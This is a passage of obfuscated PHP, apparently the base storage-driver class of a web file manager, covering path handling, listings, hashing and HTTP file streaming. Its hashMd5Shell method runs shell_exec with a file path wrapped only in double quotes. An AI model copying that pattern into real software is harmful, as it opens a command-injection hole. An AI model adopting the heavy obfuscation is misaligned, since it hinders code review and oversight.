$‹ƒ„óÆ[$–”Ç°’î . $¿³ìÈáã[80] . $èåò¤›â . $¿³ìÈáã[81] . $«¢Ä×÷] = $¡å—ñ­á; $‹ƒ„óÆ[$èåò¤›â . $¿³ìÈáã[80] . $–”Ç°’î . $¿³ìÈáã[81] . $«¢Ä×÷] = $«¢Ä×÷; $‹ƒ„óÆ[$èåò¤›â . $¿³ìÈáã[80] . $–”Ç°’î . $¿³ìÈáã[81] . $¡å—ñ­á] = $«¢Ä×÷; $‹ƒ„óÆ[$–”Ç°’î . $¿³ìÈáã[80] . $èåò¤›â . $¿³ìÈáã[81] . $¡å—ñ­á] = $¡å—ñ­á; return $¡å—ñ­á; } public function getPathInner($ùŞ±õô¦) { $»Ùà§ûÉ = IO::init($ùŞ±õô¦); return $»Ùà§ûÉ->path; } public function getPathOuter($–ã¶ªÛİ) { $–­ä„³£ =& $_SERVER[ë¦»ºéÌ]; $ÀÑÃ¹½Ì = strlen(trim($this->pathBase, $–­ä„³£[8])); $–ã¶ªÛİ = substr(trim($–ã¶ªÛİ, $–­ä„³£[8]), $ÀÑÃ¹½Ì); return $this->pathDriver . $–­ä„³£[8] . ltrim($–ã¶ªÛİ, $–­ä„³£[8]); } public function isParentOf($ò–ç±ğ, $®Ô¸ÚúÃ) { $®ƒ”×ÔÏ =& $_SERVER[ë¦»ºéÌ]; $ò–ç±ğ = rtrim(strtolower($ò–ç±ğ), $®ƒ”×ÔÏ[8]) . $®ƒ”×ÔÏ[8]; $®Ô¸ÚúÃ = rtrim(strtolower($®Ô¸ÚúÃ), $®ƒ”×ÔÏ[8]) . $®ƒ”×ÔÏ[8]; $ùÎ‹Ç÷ = strpos($®Ô¸ÚúÃ, $ò–ç±ğ) === 0; return $ùÎ‹Ç÷; } public function getType() { $°Ãê³¥ =& $_SERVER[ë¦»ºéÌ]; $ãğéûåõ = str_replace($°Ãê³¥[84], $°Ãê³¥[12], get_class($this)); return strtolower($ãğéûåõ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¬©Òò»‰, $ñ‹£ˆş´) { $¤ö¦Ì°Æ =& $_SERVER[ë¦»ºéÌ]; $¾¼ƒÜàİ = rtrim($¬©Òò»‰, $¤ö¦Ì°Æ[8]) . $¤ö¦Ì°Æ[8] . $ñ‹£ˆş´; $ÕÅ¨×Èé = $this->exist($¾¼ƒÜàİ); return $ÕÅ¨×Èé ? $¾¼ƒÜàİ : !1; } public function setModifyTime($ëŸŸÂó¸, $÷ú„Ô¹î = '') { } public function renameObject($ĞÍøá, $œÚ‹¯š) { $‹Ş¾êÂó =& $_SERVER[ë¦»ºéÌ]; $Ìï àîã = $œÚ‹¯š; Hook::trigger($‹Ş¾êÂó[85], $this, $ĞÍøá, $this, $this->pathFather($ĞÍøá) . $œÚ‹¯š); $ĞÍøá = $this->getPathOuter($ĞÍøá); $œÚ‹¯š = $this->pathFather($ĞÍøá) . $œÚ‹¯š; if (IO::isFile($ĞÍøá)) { $ÊÃÈ»­ = IO::copy($ĞÍøá, $this->pathFather($ĞÍøá), REPEAT_RENAME_FOLDER, $Ìï àîã); if ($ÊÃÈ»­) { IO::remove($ĞÍøá); } } else { $ÊÃÈ»­ = IO::mkdir($œÚ‹¯š); if (!$ÊÃÈ»­) { return !1; } $²ü¸¡Ü¥ = IO::listPath($ĞÍøá, !0); $›åÉ’§¼ = array_merge($²ü¸¡Ü¥[$‹Ş¾êÂó[86]], $²ü¸¡Ü¥[$‹Ş¾êÂó[87]]); foreach ($›åÉ’§¼ as $üØ€„ë¾) { IO::move($üØ€„ë¾[$‹Ş¾êÂó[88]], $œÚ‹¯š, REPEAT_RENAME_FOLDER); } IO::remove($ĞÍøá); } return $ÊÃÈ»­ ? $œÚ‹¯š : !1; } public function tempFile($å§ÏÓ÷ô = '', $éóñ°âÅ = '') { if (!$å§ÏÓ÷ô) { $å§ÏÓ÷ô = rand_string(15); } $¶ıç³¹Á = TEMP_FILES . rand_string(15) . $_SERVER[ë¦»ºéÌ][8]; @mkdir($¶ıç³¹Á, DEFAULT_PERRMISSIONS, !0); $¦ŒØ»šá = $¶ıç³¹Á . $å§ÏÓ÷ô; @touch($¦ŒØ»šá); if ($éóñ°âÅ) { file_put_contents($¦ŒØ»šá, $éóñ°âÅ); } return $¦ŒØ»šá; } public function tempFileRemve($Í®·Ö ©) { @unlink($Í®·Ö ©); @rmdir($this->pathFather($Í®·Ö ©)); } public function mkfile($ß…îØ¶Ú, $˜¨ØÂË = '', $³Ÿ†½Â› = REPEAT_RENAME) { } public function mkdir($ó¨Ğ÷íï, $£µìÜö = REPEAT_SKIP) { } public function delFile($÷×¤´›˜) { } public function delFolder($²£Ó—ÉÊ) { } public function copyFile($¶«úıÛÍ, $Ò‘Ê¼¢¾) { } public function moveFile($Æ Å¾ö°, $©ÈëÁßº) { } public function remove($èª…¸Ãç) { if ($this->isFile($èª…¸Ãç)) { return $this->delFile($èª…¸Ãç); } return $this->delFolder($èª…¸Ãç); } public function rename($É©€¶‹Ù, $Ë‡¹©í) { } public function exist($€¤Ê›Ñ) { } public function findByHash($Ãá‡„µ = '', $¨ñ¥Ñ†¨ = '') { return !1; } public function isFile($¿äŸ¯›×) { } public function isFolder($—ìó¡Éá) { } public function size($ÖËû¥ÍÉ) { } public function info($’øœÅÕ) { } public function infoSimple($ç‘ÉÚ¬) { return $this->info($ç‘ÉÚ¬); } public function infoAuth($¹îêôù©) { return $this->info($¹îêôù©); } public function infoFull($Ë¹ä„Ôµ) { return $this->info($Ë¹ä„Ôµ); } public function infoWithChildren($ìÔƒõÎ) { $’¡ş¸Û… =& $_SERVER[ë¦»ºéÌ]; static $×’ï¹Öˆ = array(); if (isset($×’ï¹Öˆ[$ìÔƒõÎ])) { return $×’ï¹Öˆ[$ìÔƒõÎ]; } $Ÿ¾Ô†´Š = $this->info($ìÔƒõÎ); if ($Ÿ¾Ô†´Š && $Ÿ¾Ô†´Š[$’¡ş¸Û…[43]] == $’¡ş¸Û…[89]) { $ÑÌ”¤ºÑ = array($’¡ş¸Û…[90] => 0, $’¡ş¸Û…[91] => 0, $’¡ş¸Û…[92] => 0); $this->infoChildren($ìÔƒõÎ, $ÑÌ”¤ºÑ); $Ÿ¾Ô†´Š[$’¡ş¸Û…[90]] = $ÑÌ”¤ºÑ[$’¡ş¸Û…[90]]; $Ÿ¾Ô†´Š[$’¡ş¸Û…[93]] = array($’¡ş¸Û…[94] => $ÑÌ”¤ºÑ[$’¡ş¸Û…[91]], $’¡ş¸Û…[95] => $ÑÌ”¤ºÑ[$’¡ş¸Û…[92]]); $×’ï¹Öˆ[$ìÔƒõÎ] = $Ÿ¾Ô†´Š; } return $Ÿ¾Ô†´Š; } public function listPath($©º®Û™‹, $‘³—òÚ¾ = false) { } public function has($ËÃ÷ ı˜, $·ë°å·µ = false, $´è°´Ë = false) { } public function canRead($–ã¹÷ó) { } public function canWrite($åÃ´) { } public function getContent($ö—«òó¥) { } public function setContent($ğ½­àú¦, $Ã¨¥Ëºü = '') { } protected function infoChildren($Ë›½Šãò, &$ßŞ• ¨) { $çÇ¹ô¶ô =& $_SERVER[ë¦»ºéÌ]; check_abort_echo(); $¹•µéì = $this->listPath($Ë›½Šãò, !0); $¹•µéì = array_merge($¹•µéì[$çÇ¹ô¶ô[87]], $¹•µéì[$çÇ¹ô¶ô[86]]); foreach ($¹•µéì as $èøªü•ë) { if ($èøªü•ë[$çÇ¹ô¶ô[43]] == $çÇ¹ô¶ô[89]) { $ßŞ• ¨[$çÇ¹ô¶ô[92]]++; $¶Ãìâ¾œ = $this->getPathInner($èøªü•ë[$çÇ¹ô¶ô[88]]); $this->infoChildren($¶Ãìâ¾œ, $ßŞ• ¨); } else { $ßŞ• ¨[$çÇ¹ô¶ô[91]]++; $ßŞ• ¨[$çÇ¹ô¶ô[90]] += $èøªü•ë[$çÇ¹ô¶ô[90]]; } } } public function fileSubstr($õû™ÓĞÂ, $æôˆÃ«À, $Á‹£ë’) { } public function listAll($•œó°Õî) { } public function listAllMake($ğ¶¨ƒ¹£, &$ Ø×©è“) { $ˆÂÂñ‹¢ =& $_SERVER[ë¦»ºéÌ]; check_abort_echo(); $Í”•èıÇ = $this->listPath($ğ¶¨ƒ¹£, !0); if (!$Í”•èıÇ) { return; } $•Şæ´½ = array_merge($Í”•èıÇ[$ˆÂÂñ‹¢[87]], $Í”•èıÇ[$ˆÂÂñ‹¢[86]]); foreach ($•Şæ´½ as $û›ùÙÅ•) { $§ŠÊ¥æ = $û›ùÙÅ•[$ˆÂÂñ‹¢[43]] == $ˆÂÂñ‹¢[89]; $‘—†úòİ = array($ˆÂÂñ‹¢[88] => $û›ùÙÅ•[$ˆÂÂñ‹¢[88]], $ˆÂÂñ‹¢[89] => $§ŠÊ¥æ); if (isset($û›ùÙÅ•[$ˆÂÂñ‹¢[90]])) { $‘—†úòİ[$ˆÂÂñ‹¢[90]] = $û›ùÙÅ•[$ˆÂÂñ‹¢[90]]; } if (isset($û›ùÙÅ•[$ˆÂÂñ‹¢[96]])) { $‘—†úòİ[$ˆÂÂñ‹¢[96]] = $û›ùÙÅ•[$ˆÂÂñ‹¢[96]]; } if (!$§ŠÊ¥æ) { $ Ø×©è“[] = $‘—†úòİ; continue; } $ Ø×©è“[] = $‘—†úòİ; $àÖãƒ¤– = $û›ùÙÅ•[$ˆÂÂñ‹¢[88]]; $²Ì™ˆÌ· = $this->pathDriver; if (substr($û›ùÙÅ•[$ˆÂÂñ‹¢[88]], 0, strlen($²Ì™ˆÌ·)) == $²Ì™ˆÌ·) { $àÖãƒ¤– = substr($àÖãƒ¤–, strlen($²Ì™ˆÌ·)); } $this->listAllMake($àÖãƒ¤–, $ Ø×©è“); } } public function listAllSimple($çËãæİ) { $×ê´ŸŸ„ =& $_SERVER[ë¦»ºéÌ]; $êİ÷©»Ÿ = array(); $‘ÜĞ Íš = $this->listAll($çËãæİ); $÷–ß¾‰— = $this->getPathOuter($çËãæİ); foreach ($‘ÜĞ Íš as $Ùå ¼§í) { $ú¸ŸğÈÕ = $Ùå ¼§í[$×ê´ŸŸ„[88]]; $ŞëšÅ = $Ùå ¼§í[$×ê´ŸŸ„[88]]; if (isset($Ùå ¼§í[$×ê´ŸŸ„[97]])) { $ú¸ŸğÈÕ = $Ùå ¼§í[$×ê´ŸŸ„[97]][$×ê´ŸŸ„[88]]; $Ùå ¼§í[$×ê´ŸŸ„[90]] = $Ùå ¼§í[$×ê´ŸŸ„[97]][$×ê´ŸŸ„[90]]; $Ùå ¼§í[$×ê´ŸŸ„[96]] = $Ùå ¼§í[$×ê´ŸŸ„[97]][$×ê´ŸŸ„[96]]; } else { $ŞëšÅ = substr($Ùå ¼§í[$×ê´ŸŸ„[88]], strlen(get_path_father($÷–ß¾‰—))); $ŞëšÅ = $×ê´ŸŸ„[8] . ltrim($ŞëšÅ, $×ê´ŸŸ„[8]); } $ƒÃ……ŒÜ = array($×ê´ŸŸ„[88] => $ŞëšÅ, $×ê´ŸŸ„[89] => $Ùå ¼§í[$×ê´ŸŸ„[89]]); if (isset($Ùå ¼§í[$×ê´ŸŸ„[90]]) && !$Ùå ¼§í[$×ê´ŸŸ„[89]]) { $ƒÃ……ŒÜ[$×ê´ŸŸ„[90]] = $Ùå ¼§í[$×ê´ŸŸ„[90]]; } if (isset($Ùå ¼§í[$×ê´ŸŸ„[96]])) { $ƒÃ……ŒÜ[$×ê´ŸŸ„[96]] = $Ùå ¼§í[$×ê´ŸŸ„[96]]; } if (!$Ùå ¼§í[$×ê´ŸŸ„[89]]) { $ƒÃ……ŒÜ[$×ê´ŸŸ„[98]] = $ú¸ŸğÈÕ; } $êİ÷©»Ÿ[] = $ƒÃ……ŒÜ; } return $êİ÷©»Ÿ; } public function upload($æ²éíığ, $»±üÕƒœ, $Ù³„¤‰ó = false, $™å»¢¦Í = REPEAT_REPLACE) { } public function uploadFileByID($¨çÎîô, $´òìú¡†, $õû½‹ĞÛ) { } public function uploadFileByPath($İ¹´•µ¢, $ı×—ƒÁã, $ßÌê»ÅŞ = array()) { } public function isUploadServer() { $åæĞâ° =& $_SERVER[ë¦»ºéÌ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $åæĞâ°[99]) { return !0; } return $GLOBALS[$åæĞâ°[6]][$åæĞâ°[100]][$åæĞâ°[101]]; } public function isFileOutServer() { $áõçÉ‰ =& $_SERVER[ë¦»ºéÌ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $áõçÉ‰[99]) { return !0; } return $GLOBALS[$áõçÉ‰[6]][$áõçÉ‰[100]][$áõçÉ‰[102]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Î“Å¸áÜ) { $ÛÉóüû =& $_SERVER[ë¦»ºéÌ]; if (!$this->isCdnHost()) { return $Î“Å¸áÜ; } return str_replace(trim(get_url_root($Î“Å¸áÜ), $ÛÉóüû[8]), trim($this->cdnHost, $ÛÉóüû[8]), $Î“Å¸áÜ); } public function uploadLink($´ÂöĞó±, $ÌĞ„±±‚ = 0) { $÷·®‡çı =& $_SERVER[ë¦»ºéÌ]; if ($this->isUploadServer()) { return; } $•©ôêŸ = $this->getType(); if (!in_array($•©ôêŸ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Œó„ó§¿ = 1024 * 1024 * 10; $Ş±êí¿© = $ÌĞ„±±‚ <= $Œó„ó§¿ ? $÷·®‡çı[103] : $÷·®‡çı[104]; $¤ÜŸÚÄ¯ = (!$ÌĞ„±±‚ ? 1 : ceil($ÌĞ„±±‚ / pow(1024, 3))) * 3600 * 4; $ï›£ËèÙ = $this->{$Ş±êí¿©}($´ÂöĞó±, $¤ÜŸÚÄ¯); if ($ï›£ËèÙ) { $ï›£ËèÙ[$÷·®‡çı[105]] = $´ÂöĞó±; $ï›£ËèÙ[$÷·®‡çı[106]] = $•©ôêŸ; } return $ï›£ËèÙ; } public function uploadFormData($ŞáØ½ı¬, $öĞ×Ñ³¿ = 3600) { } public function multiUploadFormData($¬´¬ùÔÃ, $§­ØüâÇ = 3600) { } public function download($¾í½¶‹¡, $›Şî˜“¤) { } public function ext($ŞîøÍ×‹) { $›µó¯’– =& $_SERVER[ë¦»ºéÌ]; if (strpos($ŞîøÍ×‹, $›µó¯’–[8]) === -1) { $•·ÏÓ„æ = $ŞîøÍ×‹; } else { $•·ÏÓ„æ = $this->pathThis($ŞîøÍ×‹); } $óÀÒ’“ = $›µó¯’–[12]; if (strstr($•·ÏÓ„æ, $›µó¯’–[10])) { $óÀÒ’“ = substr($•·ÏÓ„æ, strrpos($•·ÏÓ„æ, $›µó¯’–[10]) + 1); $óÀÒ’“ = strtolower($óÀÒ’“); } if (strlen($óÀÒ’“) > 3 && preg_match($›µó¯’–[107], $óÀÒ’“, $ÍøüôšÎ)) { $óÀÒ’“ = $›µó¯’–[12]; } return $óÀÒ’“; } public function pathThis($ºî‰âùâ) { $ö ªÒĞ± =& $_SERVER[ë¦»ºéÌ]; $ºî‰âùâ = str_replace($ö ªÒĞ±[108], $ö ªÒĞ±[8], rtrim($ºî‰âùâ, $ö ªÒĞ±[8])); $ßºÁÇü¹ = strrpos($ºî‰âùâ, $ö ªÒĞ±[8]); if ($ßºÁÇü¹ === !1) { return $ºî‰âùâ; } return substr($ºî‰âùâ, $ßºÁÇü¹ + 1); } public function pathFather($Ã¯“¡œ) { $çÈ€ˆ—ê =& $_SERVER[ë¦»ºéÌ]; $Ã¯“¡œ = str_replace($çÈ€ˆ—ê[108], $çÈ€ˆ—ê[8], rtrim($Ã¯“¡œ, $çÈ€ˆ—ê[8])); $ë¿ÏÛâ = strrpos($Ã¯“¡œ, $çÈ€ˆ—ê[8]); if ($ë¿ÏÛâ === !1) { return $çÈ€ˆ—ê[12]; } return substr($Ã¯“¡œ, 0, $ë¿ÏÛâ + 1); } public function hashSimple($Äñ¼Ú¨) { $’å–Š¨ =& $_SERVER[ë¦»ºéÌ]; if (!$Äñ¼Ú¨) { return md5($’å–Š¨[12]); } $³çùöà” = $this->size($Äñ¼Ú¨); $¢ß˜åºº = 200; $¨ÉÔ±ãƒ = 50; if ($³çùöà” <= $¢ß˜åºº * $¨ÉÔ±ãƒ) { return $this->hashMd5($Äñ¼Ú¨) . $³çùöà”; } $™¥“­· = intval($³çùöà” / $¨ÉÔ±ãƒ); $öÔø›™“ = $’å–Š¨[12]; for ($“îõ¤û = 0; $“îõ¤û < $¨ÉÔ±ãƒ; $“îõ¤û++) { $öÔø›™“ .= $this->fileSubstr($Äñ¼Ú¨, $™¥“­· * $“îõ¤û, $¢ß˜åºº); } $öÔø›™“ .= $this->fileSubstr($Äñ¼Ú¨, $³çùöà” - $¢ß˜åºº, $¢ß˜åºº); return md5($öÔø›™“) . $³çùöà”; } public static $md5Cache = array(); public function hashMd5($¸Åğ¢ª) { if (!$¸Åğ¢ª) { return md5($_SERVER[ë¦»ºéÌ][12]); } $¸Åğ¢ª = $this->iconvSystem($¸Åğ¢ª); if (isset(self::$md5Cache[$¸Åğ¢ª])) { return self::$md5Cache[$¸Åğ¢ª]; } self::$md5Cache[$¸Åğ¢ª] = $this->hashMd5Shell($¸Åğ¢ª); if (!self::$md5Cache[$¸Åğ¢ª]) { self::$md5Cache[$¸Åğ¢ª] = @md5_file($¸Åğ¢ª); } return self::$md5Cache[$¸Åğ¢ª]; } private function hashMd5Shell($‰‹ğ¶Ğ­) { $İ®Û²£Œ =& $_SERVER[ë¦»ºéÌ]; if (!$‰‹ğ¶Ğ­) { return md5($İ®Û²£Œ[12]); } if (!function_exists($İ®Û²£Œ[109])) { return !1; } $‡¯ö²Èƒ = array($İ®Û²£Œ[110], $İ®Û²£Œ[111]); $˜…İÎ­Ü = Cache::get($İ®Û²£Œ[112]); if (!$˜…İÎ­Ü) { $›Î˜¶à‹ = BASIC_PATH . $İ®Û²£Œ[113]; $Õ¨ïĞ‚ = md5_file($›Î˜¶à‹); $˜…İÎ­Ü = $İ®Û²£Œ[114]; foreach ($‡¯ö²Èƒ as $ó‡éŒª²) { $‰Ö›Æõ• = shell_exec($ó‡éŒª² . "\40\x22{$›Î˜¶à‹}\x22"); if ($‰Ö›Æõ• && substr(trim($‰Ö›Æõ•), 0, 32) == $Õ¨ïĞ‚) { $˜…İÎ­Ü = $ó‡éŒª²; break; } } Cache::set($İ®Û²£Œ[112], $˜…İÎ­Ü, 3600); } if ($˜…İÎ­Ü == $İ®Û²£Œ[114]) { return !1; } $‰Ö›Æõ• = shell_exec($˜…İÎ­Ü . "\x20\42{$‰‹ğ¶Ğ­}\x22"); $‰Ö›Æõ• = str_replace($İ®Û²£Œ[115], $İ®Û²£Œ[12], $‰Ö›Æõ•); return substr($‰Ö›Æõ•, 0, 32); } public function link($¬ğÈùØ‡) { return $¬ğÈùØ‡; } public function fileOut($õÎş’øç, $¿ãğ‰Ä = false, $ÁÌåª”¶ = false, $ÃÛşê¡» = '') { $†°¹‡Ñ =& $_SERVER[ë¦»ºéÌ]; $this->cacheMethod(null, null); if (!$õÎş’øç || !$this->exist($õÎş’øç)) { show_json(LNG($†°¹‡Ñ[116]), !1, $ÁÌåª”¶); } $‡ñô•ˆÄ = $this->getType() == $†°¹‡Ñ[117]; $üÌ¾•Á² = $GLOBALS[$†°¹‡Ñ[6]][$†°¹‡Ñ[100]][$†°¹‡Ñ[118]][$†°¹‡Ñ[119]]; $ ÅÅŞ— = (double) $GLOBALS[$†°¹‡Ñ[6]][$†°¹‡Ñ[100]][$†°¹‡Ñ[118]][$†°¹‡Ñ[120]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÖË´Šù = $this->infoFull($õÎş’øç); $ æö×öÃ = $ÖË´Šù[$†°¹‡Ñ[90]]; $Ö³øâã¼ = gmdate($†°¹‡Ñ[121], $ÖË´Šù[$†°¹‡Ñ[96]]); $“‡ãÎĞÃ = $ÁÌåª”¶ ? $ÁÌåª”¶ : $this->iconvApp($ÖË´Šù[$†°¹‡Ñ[42]]); $×í£À×ä = 0; $Ò†„Â­’ = $ æö×öÃ - 1; $şšõáÒ¼ = $this->ext($“‡ãÎĞÃ); if (in_array($şšõáÒ¼, array($†°¹‡Ñ[122], $†°¹‡Ñ[123], $†°¹‡Ñ[124], $†°¹‡Ñ[125]))) { $şšõáÒ¼ = $†°¹‡Ñ[126]; } if (in_array($şšõáÒ¼, array($†°¹‡Ñ[127]))) { $şšõáÒ¼ = $†°¹‡Ñ[128]; } if (!$ÃÛşê¡») { $ÃÛşê¡» = md5($Ö³øâã¼ . $this->hashSimple($õÎş’øç)); } $ÃÛşê¡» = $†°¹‡Ñ[129] . $ÃÛşê¡» . $†°¹‡Ñ[129]; $‡ÁÖÃÈ = get_file_mime($şšõáÒ¼); if ($¿ãğ‰Ä === !1 && !mime_support($‡ÁÖÃÈ)) { $¿ãğ‰Ä = !0; $‡ÁÖÃÈ = $†°¹‡Ñ[130]; } header($†°¹‡Ñ[131]); header($†°¹‡Ñ[132] . $‡ÁÖÃÈ); $â„—Âå = rawurlencode($“‡ãÎĞÃ); $â„—Âå = $†°¹‡Ñ[129] . $â„—Âå . $†°¹‡Ñ[133] . $â„—Âå; if ($¿ãğ‰Ä) { header($†°¹‡Ñ[134]); header($†°¹‡Ñ[135] . $â„—Âå); } else { } header($†°¹‡Ñ[136] . gmdate($†°¹‡Ñ[121], time() + 3600 * 24 * 30) . $†°¹‡Ñ[137]); header($†°¹‡Ñ[138]); header($†°¹‡Ñ[139]); header($†°¹‡Ñ[140]); if (isset($_SERVER[$†°¹‡Ñ[141]]) && strtotime($_SERVER[$†°¹‡Ñ[141]]) == $ÖË´Šù[$†°¹‡Ñ[96]]) { header($†°¹‡Ñ[142], !0, 304); die; } if (isset($_SERVER[$†°¹‡Ñ[143]]) && $_SERVER[$†°¹‡Ñ[143]] == $ÃÛşê¡») { header($†°¹‡Ñ[144] . $ÃÛşê¡», !0, 304); die; } header($†°¹‡Ñ[144] . $ÃÛşê¡»); header($†°¹‡Ñ[145] . $Ö³øâã¼ . $†°¹‡Ñ[137]); header($†°¹‡Ñ[146] . $“‡ãÎĞÃ); header($†°¹‡Ñ[147]); header($†°¹‡Ñ[148] . $ æö×öÃ); header($†°¹‡Ñ[149]); if (!$¿ãğ‰Ä && $şšõáÒ¼ == $†°¹‡Ñ[150]) { if ($ æö×öÃ > 1024 * 1024 * 5) { die; } $°´Ì„ª¾ = $this->getContent($õÎş’øç); $°´Ì„ª¾ = Html::clearSVG($°´Ì„ª¾); header($†°¹‡Ñ[151] . strlen($°´Ì„ª¾)); echo $°´Ì„ª¾; die; } $™¼ï¢â¹ = strtolower($_SERVER[$†°¹‡Ñ[152]]); if ($‡ñô•ˆÄ && $™¼ï¢â¹ && $üÌ¾•Á²) { if (strstr($™¼ï¢â¹, $†°¹‡Ñ[153])) { header($†°¹‡Ñ[154] . $õÎş’øç); } else { if (strstr($™¼ï¢â¹, $†°¹‡Ñ[155])) { header($†°¹‡Ñ[156] . $õÎş’øç); } else { if (strstr($™¼ï¢â¹, $†°¹‡Ñ[157])) { header($†°¹‡Ñ[158] . $õÎş’øç); } } } if ($ ÅÅŞ—) { header($†°¹‡Ñ[159] . $ ÅÅŞ—); } return; } if (isset($_SERVER[$†°¹‡Ñ[160]])) { if (preg_match($†°¹‡Ñ[161], $_SERVER[$†°¹‡Ñ[160]], $¬­Éä’—)) { $×í£À×ä = intval($¬­Éä’—[1]); if (!empty($¬­Éä’—[2])) { $Ò†„Â­’ = intval($¬­Éä’—[2]); } } header($†°¹‡Ñ[162]); header("\103\157\156\164\x65\x6e\x74\x2d\122\141\156\147\x65\72\40\x62\x79\x74\145\163\x20{$×í£À×ä}\55{$Ò†„Â­’}\x2f" . $ æö×öÃ); } else { header($†°¹‡Ñ[163]); } header($†°¹‡Ñ[164]); $Èöø² = !0; if ($_SERVER[$†°¹‡Ñ[165]] == $†°¹‡Ñ[166] && $ æö×öÃ > 1204 * 1024 * 1024 * 2) { $Èöø² = !1; } if ($Èöø²) { header($†°¹‡Ñ[167] . ($Ò†„Â­’ - $×í£À×ä + 1)); } if ($_SERVER[$†°¹‡Ñ[168]] == $†°¹‡Ñ[169]) { return; } $ÛÛ²Ã‘ = 1024 * 100; $ŒµÜŸú¤ = 0; if ($ ÅÅŞ—) { $ŒµÜŸú¤ = intval(1000 * 1000 * ($ÛÛ²Ã‘ / $ ÅÅŞ—)); } while ($×í£À×ä <= $Ò†„Â­’) { $¶Õ³€Ş™ = timeFloat(); check_abort(); $õÛ¶ÅËõ = $Ò†„Â­’ - $×í£À×ä + 1; if ($õÛ¶ÅËõ <= $ÛÛ²Ã‘) { $ÛÛ²Ã‘ = $õÛ¶ÅËõ; } echo $this->fileSubstr($õÎş’øç, $×í£À×ä, $ÛÛ²Ã‘); $×í£À×ä += $ÛÛ²Ã‘; if ($ÛÛ²Ã‘ == $õÛ¶ÅËõ) { $×í£À×ä = $Ò†„Â­’ + 1; } if ($ŒµÜŸú¤) { $Œ¡ËÇ‘¦ = intval(1000 * 1000 * (timeFloat() - $¶Õ³€Ş™)); $ûà‘ğã© = $ŒµÜŸú¤ - $Œ¡ËÇ‘¦; if ($ûà‘ğã© > 5) { usleep($ûà‘ğã©); } } } } public function fileOutServer($ÑŠéœšò, $†–œÁ¸® = false, $„¢‡³ªò = false, $ñŞ±â®© = '') { $this->fileOut($ÑŠéœšò, $†–œÁ¸®, $„¢‡³ªò, $ñŞ±â®©); } public function fileOutLink($¾Ìœâ´ï) { header($_SERVER[ë¦»ºéÌ][170] . $¾Ìœâ´ï); die; } public function cacheMethod($åÙ´æÜš, $¨‹¿ÑÇÕ, $ıÕĞÌ– = null) { $·Ø”½ø =& $_SERVER[ë¦»ºéÌ]; static $È—£‡í = array(); $¶ŒÙ©óÈ = $¨‹¿ÑÇÕ ? ltrim($this->getPathOuter($¨‹¿ÑÇÕ), $·Ø”½ø[8]) : $¨‹¿ÑÇÕ; $­§ï´ìÂ = $·Ø”½ø[171] . $åÙ´æÜš . $·Ø”½ø[172] . rtrim($¶ŒÙ©óÈ, $·Ø”½ø[8]); if (is_null($åÙ´æÜš)) { $È—£‡í = array(); return; } if (is_null($¨‹¿ÑÇÕ)) { unset($È—£‡í[$­§ï´ìÂ]); return; } if (!is_null($ıÕĞÌ–)) { $È—£‡í[$­§ï´ìÂ] = $ıÕĞÌ–; return; } $­·ÃÙ¡ñ = isset($È—£‡í[$­§ï´ìÂ]) ? $È—£‡í[$­§ï´ìÂ] : null; if (!is_null($­·ÃÙ¡ñ)) { return $­·ÃÙ¡ñ; } $­·ÃÙ¡ñ = $this->{$åÙ´æÜš}($¨‹¿ÑÇÕ); $È—£‡í[$­§ï´ìÂ] = $­·ÃÙ¡ñ; return $­·ÃÙ¡ñ; } public function fileOutImage($òıŠçÆ, $À„…¤òš = 250) { $Æ¤íœ¤ =& $_SERVER[ë¦»ºéÌ]; set_timeout(); if (substr($òıŠçÆ, 0, 4) == $Æ¤íœ¤[157]) { $this->fileOutLink($òıŠçÆ); } $Şº›ş©¯ = $this->info($òıŠçÆ); $ˆÒ¯õ = $Şº›ş©¯[$Æ¤íœ¤[42]]; $Á˜Á½¡ = !1; if (isset($GLOBALS[$Æ¤íœ¤[173]]) && $GLOBALS[$Æ¤íœ¤[173]][$Æ¤íœ¤[88]] == $Şº›ş©¯[$Æ¤íœ¤[88]]) { $×åÒ¢é€ = $GLOBALS[$Æ¤íœ¤[173]][$Æ¤íœ¤[174]]; if (!$Şº›ş©¯[$Æ¤íœ¤[175]]) { $Şº›ş©¯[$Æ¤íœ¤[175]] = $GLOBALS[$Æ¤íœ¤[173]]; } if (isset($×åÒ¢é€[$Æ¤íœ¤[176]])) { if ($×åÒ¢é€[$Æ¤íœ¤[176]] <= $À„…¤òš && $×åÒ¢é€[$Æ¤íœ¤[177]] <= $À„…¤òš) { $Á˜Á½¡ = !0; } } $ˆÒ¯õ = $Şº›ş©¯[$Æ¤íœ¤[175]][$Æ¤íœ¤[42]]; } if ($Şº›ş©¯[$Æ¤íœ¤[90]] <= 1024 * 50 || $Á˜Á½¡ || !function_exists($Æ¤íœ¤[178]) || $Şº›ş©¯[$Æ¤íœ¤[179]] == $Æ¤íœ¤[180]) { return $this->fileOut($òıŠçÆ, !1, $ˆÒ¯õ); } if (isset($Şº›ş©¯[$Æ¤íœ¤[175]][$Æ¤íœ¤[181]])) { $Ñ’ÖÊÕê = $Şº›ş©¯[$Æ¤íœ¤[175]][$Æ¤íœ¤[181]]; } else { if (isset($Şº›ş©¯[$Æ¤íœ¤[175]][$Æ¤íœ¤[182]])) { $Ñ’ÖÊÕê = $Şº›ş©¯[$Æ¤íœ¤[175]][$Æ¤íœ¤[182]]; } else { $Ñ’ÖÊÕê = md5("{$Şº›ş©¯[$Æ¤íœ¤[42]]}\x5f{$Şº›ş©¯[$Æ¤íœ¤[88]]}\x5f{$Şº›ş©¯[$Æ¤íœ¤[90]]}"); } } $ÒİŠÓŸì = "{$Ñ’ÖÊÕê}\137{$À„…¤òš}\56\x70\x6e\147"; if (!($¸ï¼ÔÉ¥ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Æ¤íœ¤[183]))) { $äªº§Êï = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Æ¤íœ¤[184]); } else { $äªº§Êï = KodIO::make($¸ï¼ÔÉ¥); } if ($¸ï¼ÔÉ¥ = IO::fileNameExist($äªº§Êï, $ÒİŠÓŸì)) { $¯Ã‚¥Ÿã = KodIO::make($¸ï¼ÔÉ¥); return IO::fileOut($¯Ã‚¥Ÿã, !1, $ˆÒ¯õ); } if (!is_dir(DATA_THUMB)) { 